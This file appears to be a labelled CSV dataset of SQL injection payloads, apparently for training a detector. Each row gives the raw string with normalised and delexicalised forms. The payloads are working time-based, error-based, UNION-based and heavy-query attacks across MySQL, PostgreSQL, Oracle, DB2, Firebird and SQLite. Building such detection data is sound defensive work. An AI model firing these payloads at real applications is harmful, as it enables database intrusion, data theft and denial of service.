payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,1,sqli_dataset.csv,,False,1' ) waitfor delay '0:0:5' and ( 'peyv' like 'peyv,<NUM><STR><NUM>:<NUM>:<NUM><STR>peyv<STR>peyv
1'||  (  select 'dezl' where 8661  =  8661,1,sqli_dataset.csv,,False,1'|| ( select 'dezl' where 8661 = 8661,<NUM><STR>dezl' where <NUM> = <NUM>
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'uvlu'  =  'uvlu",1,sqli_dataset.csv,,False,"1' ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'uvlu' = 'uvlu",<NUM><STR>uvlu<STR>uvlu
1' where 2145  =  2145,1,sqli_dataset.csv,,False,1' where 2145 = 2145,<NUM>' where <NUM> = <NUM>
"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""kins""  =  ""kins",1,sqli_dataset.csv,,False,"1"" or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ""kins"" = ""kins",<NUM><STR>kins<STR>kins
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",1,sqli_dataset.csv,,True,"1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( 'mevd' = 'mevd",<NUM><STR>mevd<STR>mevd
"-1079""  )   where 2865  =  2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",1,sqli_dataset.csv,,False,"-1079"" ) where 2865 = 2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#","-<NUM>"" ) where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
 (  select   (  case when   (  5792  =  5792  )   then 5792 else 1/  (  select 0  )   end   )    ) ,1,sqli_dataset.csv,,False,( select ( case when ( 5792 = 5792 ) then 5792 else 1/ ( select 0 ) end ) ),( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) )
-6377' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'qcms' like 'qcms,1,sqli_dataset.csv,,False,-6377' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'qcms' like 'qcms,-<NUM><STR>qcms<STR>qcms
end,1,sqli_dataset.csv,,False,end,end
"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",1,sqli_dataset.csv,,False,"-1894' ) union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#","-<NUM>' ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
1%'   )    )     )   union all select null--,1,sqli_dataset.csv,,False,1%' ) ) ) union all select null--,<NUM>%' ) ) ) union all select null--
1   )    )    order by 1--,1,sqli_dataset.csv,,False,1 ) ) order by 1--,<NUM> ) ) order by <NUM>--
-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,1,sqli_dataset.csv,,True,-7874 ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 2817 = 2817,-<NUM> ) ) ) or <NUM> in ( ( char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) ) and ( ( ( <NUM> = <NUM>
"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1,sqli_dataset.csv,,True,"1 ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )","<NUM> ) procedure analyse ( extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ,0x717a767a71 ) ) ,<NUM> )"
"1'  )   where 1470  =  1470 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1' ) where 1470 = 1470 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>' ) where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
"-9451""   )    )     )   union all select 4211,4211,4211,4211,4211,4211,4211--",1,sqli_dataset.csv,,False,"-9451"" ) ) ) union all select 4211,4211,4211,4211,4211,4211,4211--","-<NUM>"" ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"-2953""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""oaeh""  =  ""oaeh",1,sqli_dataset.csv,,False,"-2953"" ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""oaeh"" = ""oaeh",-<NUM><STR>oaeh<STR>oaeh
-6015%'  )   order by 1--,1,sqli_dataset.csv,,False,-6015%' ) order by 1--,-<NUM>%' ) order by <NUM>--
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'diyb' like 'diyb,1,sqli_dataset.csv,,False,1' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'diyb' like 'diyb,<NUM><STR>qqpjq<STR>qzvzq<STR>diyb<STR>diyb
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",1,sqli_dataset.csv,,True,"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and 'owwf' = 'owwf",<NUM><STR>owwf<STR>owwf
"1"" where 1852  =  1852 union all select null,null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1"" where 1852 = 1852 union all select null,null,null,null,null,null,null,null,null#","<NUM>"" where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null#"
-1549'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'fnwx'  =  'fnwx,1,sqli_dataset.csv,,False,-1549' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 'fnwx' = 'fnwx,-<NUM><STR>fnwx<STR>fnwx
"1""   )    )    as nlgn where 3834  =  3834 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sqli_dataset.csv,,False,"1"" ) ) as nlgn where 3834 = 3834 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>"" ) ) as nlgn where <NUM> = <NUM> and <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""%"" = ""","call regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) and <STR> = """
1  )   where 9344  =  9344,1,sqli_dataset.csv,,False,1 ) where 9344 = 9344,<NUM> ) where <NUM> = <NUM>
1'  )   where 8163  =  8163,1,sqli_dataset.csv,,False,1' ) where 8163 = 8163,<NUM>' ) where <NUM> = <NUM>
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'  =  'kiex",1,sqli_dataset.csv,,False,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex' = 'kiex","select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and <STR> = 'kiex"
select   (  case when   (  4306  =  2815  )   then 4306 else 1/  (  select 0  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 4306 = 2815 ) then 4306 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --
"1   )    )    as xutu where 5811  =  5811 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1 ) ) as xutu where 5811 = 5811 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM> ) ) as xutu where <NUM> = <NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sqli_dataset.csv,,False,1' or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,<NUM>' or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --
"1""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""diiv""  =  ""diiv",1,sqli_dataset.csv,,False,"1"" ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ""diiv"" = ""diiv",<NUM><STR>diiv<STR>diiv
"1'  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1' ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>' ) or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'mnbg' like 'mnbg",1,sqli_dataset.csv,,False,"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'mnbg' like 'mnbg",<NUM><STR>mnbg<STR>mnbg
"1   )    )    as hpxw where 1826  =  1826 union all select null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1 ) ) as hpxw where 1826 = 1826 union all select null,null,null,null,null,null,null,null#","<NUM> ) ) as hpxw where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null#"
"1%""   )    )     )   union all select null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1%"" ) ) ) union all select null,null,null,null,null,null--","<NUM>%"" ) ) ) union all select null,null,null,null,null,null--"
"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",1,sqli_dataset.csv,,False,"select count ( * ) from generate_series ( 1,5000000 ) and '%' = '","select count ( * ) from generate_series ( <NUM>,<NUM> ) and <STR> = '"
"1""  )   where 4951  =  4951",1,sqli_dataset.csv,,False,"1"" ) where 4951 = 4951","<NUM>"" ) where <NUM> = <NUM>"
"1'   )    )    as kxek where 3429  =  3429 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sqli_dataset.csv,,False,"1' ) ) as kxek where 3429 = 3429 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM><STR>abcdefg',upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --"
-3666'  )   where 6386  =  6386 union all select 6386--,1,sqli_dataset.csv,,False,-3666' ) where 6386 = 6386 union all select 6386--,-<NUM>' ) where <NUM> = <NUM> union all select <NUM>--
1%' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and '%'  =  ',1,sqli_dataset.csv,,False,1%' and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and '%' = ',<NUM>%<STR>%<STR>
1' where 6135  =  6135,1,sqli_dataset.csv,,False,1' where 6135 = 6135,<NUM>' where <NUM> = <NUM>
1%'   )    )    order by 1#,1,sqli_dataset.csv,,False,1%' ) ) order by 1#,<NUM>%' ) ) order by <NUM>#
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'dphz'  =  'dphz",1,sqli_dataset.csv,,False,"1' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'dphz' = 'dphz",<NUM><STR>dphz<STR>dphz
"1"" where 2547  =  2547 or sleep  (  5  )  #",1,sqli_dataset.csv,,False,"1"" where 2547 = 2547 or sleep ( 5 ) #","<NUM>"" where <NUM> = <NUM> or sleep ( <NUM> ) #"
"-5959"" or 2477  =  1144",1,sqli_dataset.csv,,False,"-5959"" or 2477 = 1144","-<NUM>"" or <NUM> = <NUM>"
1  )   as iqkf where 7780  =  7780,1,sqli_dataset.csv,,False,1 ) as iqkf where 7780 = 7780,<NUM> ) as iqkf where <NUM> = <NUM>
"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",1,sqli_dataset.csv,,False,"-6377'|| ( select 'ryin' where 2113 = 2113 union all select 2113,2113,2113#","-<NUM><STR>ryin' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>#"
"1%'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  '%'  =  '",1,sqli_dataset.csv,,True,"1%' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( '%' = '",<NUM>%<STR>%<STR>
"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",1,sqli_dataset.csv,,False,"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--","-<NUM>' union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"-1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv",1,sqli_dataset.csv,,False,"-1863' ) or make_set ( 9354 = 9354,7185 ) and ( 'whwv' = 'whwv",-<NUM><STR>whwv<STR>whwv
"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",1,sqli_dataset.csv,,False,"1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) )","<NUM>"" and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) )"
"1 where 7362  =  7362 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sqli_dataset.csv,,False,"1 where 7362 = 7362 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM> where <NUM> = <NUM> and <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --"
"1  )   as tkkn where 7832  =  7832   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,sqli_dataset.csv,,False,"1 ) as tkkn where 7832 = 7832 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --","<NUM> ) as tkkn where <NUM> = <NUM> ( select ( case when ( <NUM> = <NUM> ) then regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) else char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) end ) from ( values ( <NUM> ) ) ) --"
"1  )   where 7571  =  7571 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1 ) where 7571 = 7571 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --","<NUM> ) where <NUM> = <NUM> and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1  )   as ujjg where 3125  =  3125 union all select null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1 ) as ujjg where 3125 = 3125 union all select null,null,null,null,null,null#","<NUM> ) as ujjg where <NUM> = <NUM> union all select null,null,null,null,null,null#"
"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sqli_dataset.csv,,False,"1 ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM> ) ) or <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --"
1'   )    )    as dago where 9788  =  9788,1,sqli_dataset.csv,,False,1' ) ) as dago where 9788 = 9788,<NUM>' ) ) as dago where <NUM> = <NUM>
"1%""  )   and 9198  =  9198--",1,sqli_dataset.csv,,False,"1%"" ) and 9198 = 9198--","<NUM>%"" ) and <NUM> = <NUM>--"
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'  =  '",1,sqli_dataset.csv,,False,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%' = '","select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and <STR> = '"
